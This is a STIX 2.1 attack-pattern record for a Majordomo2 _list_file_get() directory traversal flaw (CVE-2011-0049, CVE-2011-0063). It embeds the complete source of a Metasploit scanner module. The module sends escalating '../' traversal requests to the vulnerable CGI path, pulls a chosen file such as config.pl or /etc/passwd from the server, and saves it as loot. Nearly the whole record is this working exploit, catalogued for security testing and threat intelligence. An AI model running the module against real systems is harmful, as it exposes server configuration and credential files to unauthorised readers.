{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--452772f5-6ac7-44ce-b78b-6d224a195641",
    "created": "2024-08-14T16:30:19.534318Z",
    "modified": "2024-08-14T16:30:19.534321Z",
    "name": "Majordomo2 _list_file_get() Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability present in the _list_file_get() function of Majordomo2 (help function). By default, this module will attempt to download the Majordomo config.pl file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/majordomo2_directory_traversal.rb",
            "external_id": "majordomo2_directory_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0049"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0063"
        },
        {
            "source_name": "reference",
            "url": "https://www.sotiriu.de/adv/NSOADV-2011-003.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'Majordomo2 _list_file_get() Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability present in\n        the _list_file_get() function of Majordomo2 (help function). By default, this\n        module will attempt to download the Majordomo config.pl file.\n      },\n      'Author'         =>\t['Nikolas Sotiriu'],\n      'References'     =>\n        [\n          ['OSVDB', '70762'],\n          ['CVE', '2011-0049'],\n          ['CVE', '2011-0063'],\n          ['URL', 'https://www.sotiriu.de/adv/NSOADV-2011-003.txt'],\n          ['EDB', '16103']\n        ],\n      'DisclosureDate' => 'Mar 08 2011',\n      'License'        =>  MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('FILE', [ true,  \"Define the remote file to view, ex:/etc/passwd\", 'config.pl']),\n        OptString.new('URI', [true, 'Majordomo vulnerable URI path', '/cgi-bin/mj_wwwusr/domain=domain?user=&passw=&func=help&extra=']),\n        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 8]),\n      ])\n  end\n\n  def run_host(ip)\n    trav_strings = [\n      '../',\n      './.../'\n    ]\n    uri  = normalize_uri(datastore['URI'])\n    file = datastore['FILE']\n    deep = datastore['DEPTH']\n    file = file.gsub(/^\\//, \"\")\n\n    trav_strings.each do |trav|\n      str = \"\"\n      i   = 1\n      while (i <= deep)\n        str = trav * i\n        payload = \"#{str}#{file}\"\n\n        res = send_request_raw(\n          {\n            'method'  => 'GET',\n            'uri'     => uri + payload,\n          }, 25)\n\n        if res.nil?\n          print_error(\"#{rhost}:#{rport} Connection timed out\")\n          return\n        end\n\n        print_status(\"#{rhost}:#{rport} Trying URL \" + payload )\n\n        if (res and res.code == 200 and res.body)\n          if res.body.match(/\\<html\\>(.*)\\<\\/html\\>/im)\n            html = $1\n\n            if res.body =~ /unknowntopic/\n              print_error(\"#{rhost}:#{rport} Could not retrieve the file\")\n            else\n              file_data = html.gsub(%r{(.*)<pre>|<\\/pre>(.*)}m, '')\n              print_good(\"#{rhost}:#{rport} Successfully retrieved #{file} and storing as loot...\")\n\n              # Transform HTML entities back to the original characters\n              file_data = file_data.gsub(/\\&gt\\;/i, '>').gsub(/\\&lt\\;/i, '<').gsub(/\\&quot\\;/i, '\"')\n\n              store_loot(\"majordomo2.traversal.file\", \"application/octet-stream\", rhost, file_data, file)\n              return\n            end\n          else\n            print_error(\"#{rhost}:#{rport} No HTML was returned\")\n          end\n        else\n          # if res is nil, we hit this\n          print_error(\"#{rhost}:#{rport} Unrecognized #{res.code} response\")\n        end\n        i += 1;\n      end\n    end\n\n    print_error(\"#{rhost}:#{rport} Not vulnerable or the DEPTH setting was too low\")\n  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n  rescue ::Timeout::Error, ::Errno::EPIPE\n  end\nend\n",
    "x_mitre_disclosure_date": "Mar 08 2011"
}